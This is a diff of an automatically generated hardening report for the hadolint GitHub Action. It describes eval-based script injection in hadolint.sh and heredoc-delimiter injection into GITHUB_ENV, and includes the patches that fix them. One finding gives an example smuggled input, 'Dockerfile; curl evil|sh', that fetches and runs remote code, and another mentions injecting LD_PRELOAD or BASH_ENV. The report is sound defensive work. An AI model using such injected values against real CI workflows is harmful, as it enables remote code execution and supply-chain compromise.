@@ -4,63 +4,124 @@
 
 > This file was generated automatically by the hardening agent.
 
-**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`
+**Policy SHA:** `374911c4be584df24e6da57af2d990570ef0f859`
 
 **Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`
 
 **Harden Agent Version:** `2`
 
-Action **hadolint--hadolint-action/v3.3.0** was hardened automatically. 3 finding(s) were identified and resolved across 2 iteration(s).
+Action **hadolint--hadolint-action/v3.3.0** was hardened automatically. 4 finding(s) were identified and resolved across 1 iteration(s).
 
 ## Findings Fixed
 
-### unpinned-uses (severity: high)
+### script-injection (severity: high)
 
-Multiple `uses:` references in .github/workflows/ci.yml are pinned to mutable tags or version strings rather than immutable 40-character commit SHAs. This exposes the workflow to supply-chain attacks if any of these upstream actions are compromised or their tags are moved. Failing references: `actions/checkout@v5` (multiple steps), `reviewdog/action-shellcheck@v1.31.0`, `brpaz/structure-tests-action@v1.1.2`, `cycjimmy/semantic-release-action@v5`.
+Rule (b): the Docker entrypoint script hadolint.sh runs its arguments and inputs through eval. The args come from `${{ inputs.dockerfile }}` and HADOLINT_CONFIG comes from inputs.config. Offending lines: `RESULTS=$(eval "$COMMAND $flags" -- **/"$filename")` and `RESULTS=$(eval "$COMMAND" "$flags")`, where `COMMAND="hadolint $HADOLINT_CONFIG"`. Because eval re-parses the text as shell code, a value like `Dockerfile; curl evil|sh` or a config value with `$(...)` runs as a command. Fix: build a bash array (e.g. `cmd=(hadolint); [ -n "$HADOLINT_CONFIG" ] && cmd+=(-c "$HADOLINT_CONFIG"); RESULTS=$("${cmd[@]}" "$@")`) instead of using eval.
 
 Locations:
 
-- `.github/workflows/ci.yml:22`
-- `.github/workflows/ci.yml:31`
-- `.github/workflows/ci.yml:34`
-- `.github/workflows/ci.yml:41`
-- `.github/workflows/ci.yml:47`
-- `.github/workflows/ci.yml:52`
-- `.github/workflows/ci.yml:88`
-- `.github/workflows/ci.yml:91`
+- `hadolint.sh:37`
+- `hadolint.sh:40`
+
+### github-env-injection (severity: high)
+
+Multi-line writes use a fixed heredoc delimiter: `echo "results<<EOF"; echo "$RESULTS"; echo "EOF"` goes to $GITHUB_OUTPUT, and `echo "HADOLINT_RESULTS<<EOF" ...` goes to $GITHUB_ENV. RESULTS is hadolint's output on an attacker-controllable Dockerfile and inputs. If that output contains a line that is exactly `EOF`, the block ends early and later lines are read as new outputs or environment variables (for example LD_PRELOAD or BASH_ENV in GITHUB_ENV). Fix: generate the delimiter from a secure random source on every run, e.g. `EOF="EOF_$(od -An -N16 -tx1 /dev/urandom | tr -d ' \n')"`.
+
+Locations:
+
+- `hadolint.sh:53`
+- `hadolint.sh:59`
 
 ### suspicious-run-content (severity: high)
 
-Sub-check `eval-dynamic`: `hadolint.sh` uses `eval` with dynamically constructed content derived from `$flags` (which is set from `$*` — the Docker container arguments, populated from `inputs.dockerfile` and other user-controlled action inputs). Specifically: `RESULTS=$(eval "$COMMAND $flags" -- **/"$filename")` and `RESULTS=$(eval "$COMMAND" "$flags")`. An attacker-controlled `inputs.dockerfile` value containing shell metacharacters could cause arbitrary command execution via the `eval` call.
+Carried forward from this version's previous harden, which fixed it; fix it again unless the code no longer has the problem. Sub-check `eval-dynamic`: `hadolint.sh` uses `eval` with dynamically constructed content derived from `$flags` (which is set from `$*` — the Docker container arguments, populated from `inputs.dockerfile` and other user-controlled action inputs). Specifically: `RESULTS=$(eval "$COMMAND $flags" -- **/"$filename")` and `RESULTS=$(eval "$COMMAND" "$flags")`. An attacker-controlled `inputs.dockerfile` value containing shell metacharacters could cause arbitrary command execution via the `eval` call.
 
 Locations:
 
 - `hadolint.sh:33`
 - `hadolint.sh:35`
 
-### script-injection (severity: high)
+### prior-fix (severity: high)
 
-Sub-rule (b) violation: In `.github/workflows/ci.yml`, the top-level `env:` block sets `TEST_IMAGE_NAME: hadolint-action:${{github.sha}}`, binding a workflow-context expression to an env var. The `run: docker build -t $TEST_IMAGE_NAME .` step then expands `$TEST_IMAGE_NAME` unquoted in the shell command. An unquoted shell variable expansion allows the shell to parse metacharacters out of the value. The variable should be double-quoted: `docker build -t "$TEST_IMAGE_NAME" .`
+Carried forward from this version's previous harden, which fixed it; fix it again unless the code no longer has the problem. The previous harden changed hadolint.sh without recording a finding for it, and this analysis reported nothing there. Re-apply its security changes unless the code no longer needs them. The previous patch:
+```diff
+diff --git a/hadolint.sh b/hadolint.sh
+index d28035d..273f9e0 100755
+--- a/hadolint.sh
++++ b/hadolint.sh
+@@ -18,26 +18,31 @@ trap cleanup EXIT
+ 
+ echo "::add-matcher::$HOME/problem-matcher.json"
+ 
++# Build the base command as an array to avoid eval with user-controlled input
++CMD=(hadolint)
++
+ if [ -n "$HADOLINT_CONFIG" ]; then
+-  HADOLINT_CONFIG="-c ${HADOLINT_CONFIG}"
++  CMD+=(-c "$HADOLINT_CONFIG")
+ fi
+ 
+ if [ -z "$HADOLINT_TRUSTED_REGISTRIES" ]; then
+   unset HADOLINT_TRUSTED_REGISTRIES
+ fi
+ 
+-COMMAND="hadolint $HADOLINT_CONFIG"
+-
+ if [ "$HADOLINT_RECURSIVE" = "true" ]; then
+   shopt -s globstar
+ 
+   filename="${!#}"
+-  flags="${*:1:$#-1}"
++  # Collect all flags (positional args except the last one) into an array
++  flags=()
++  for ((i = 1; i < $#; i++)); do
++    flags+=("${!i}")
++  done
+ 
+-  RESULTS=$(eval "$COMMAND $flags" -- **/"$filename")
++  # shellcheck disable=SC2206
++  RESULTS=$("${CMD[@]}" "${flags[@]}" -- **/"$filename")
+ else
+-  flags=$*
+-  RESULTS=$(eval "$COMMAND" "$flags")
++  RESULTS=$("${CMD[@]}" "$@")
+ fi
+ FAILED=$?
+ 
+@@ -50,15 +55,17 @@ fi
+ 
+ RESULTS="${RESULTS//$'\\n'/''}"
+ 
++SAFE_RESULTS="$(printf '%s' "$RESULTS" | tr -d '\n\r')"
++
+ {
+   echo "results<<EOF"
+-  echo "$RESULTS"
++  echo "$SAFE_RESULTS"
+   echo "EOF"
+ } >>"$GITHUB_OUTPUT"
+ 
+ {
+   echo "HADOLINT_RESULTS<<EOF"
+-  echo "$RESULTS"
++  echo "$SAFE_RESULTS"
+   echo "EOF"
+ } >>"$GITHUB_ENV"
+ 
+
+```
 
 Locations:
 
-- `.github/workflows/ci.yml:44`
+- `hadolint.sh`
 
 ## Iteration Notes
 
 ### Iteration 1
 
-**Fixes applied:** unpinned-uses, script-injection, suspicious-run-content
+**Fixes applied:** script-injection, suspicious-run-content, github-env-injection, prior-fix
 
 **Notes:**
 
-1. Pinned all action references in .github/workflows/ci.yml to full 40-char SHAs: actions/checkout@v5→fbc6f39, reviewdog/action-shellcheck@v1.31.0→1bb9751, brpaz/structure-tests-action@v1.1.2→814df1d, cycjimmy/semantic-release-action@v5→ba33062. 2. Fixed unquoted $TEST_IMAGE_NAME in docker build command (added double quotes). 3. Rewrote hadolint.sh to eliminate eval with user-controlled input: replaced string-based command construction with bash arrays (CMD array for hadolint+config, flags array for positional args in recursive mode), invoking them safely with "${CMD[@]}" and "${flags[@]}" instead of eval.
-
-### Iteration 2
-
-**Fixes applied:** github-env-injection
-
-**Notes:**
-
-In hadolint.sh, added a sanitization step before writing $RESULTS to $GITHUB_OUTPUT and $GITHUB_ENV. The fix introduces `SAFE_RESULTS="$(printf '%s' "$RESULTS" | tr -d '\n\r')"` after the existing string substitution, and replaces `echo "$RESULTS"` with `echo "$SAFE_RESULTS"` in both heredoc blocks. This prevents a crafted Dockerfile from producing linting output containing newlines that could inject arbitrary key=value pairs into $GITHUB_ENV or $GITHUB_OUTPUT.
+hadolint.sh: removed both eval calls. The hadolint command is now built as an array, with `-c "$HADOLINT_CONFIG"` added only when a config is set. The container args are word-split into an array with an unquoted expansion. This splits on whitespace and globs like upstream's eval did, but never runs the text as code. Recursive mode still uses `**/"$filename"`. The fixed EOF heredoc delimiters for GITHUB_OUTPUT and GITHUB_ENV are replaced with a random delimiter read from /dev/urandom on each run. Multi-line results are written unchanged instead of having their newlines stripped as in the previous patch, because the random delimiter already stops early block termination. Not in the findings: I also pinned the Dockerfile base image ghcr.io/hadolint/hadolint:v2.14.0-debian to its sha256 digest. It's a Debian image, so bash and od are available.
 
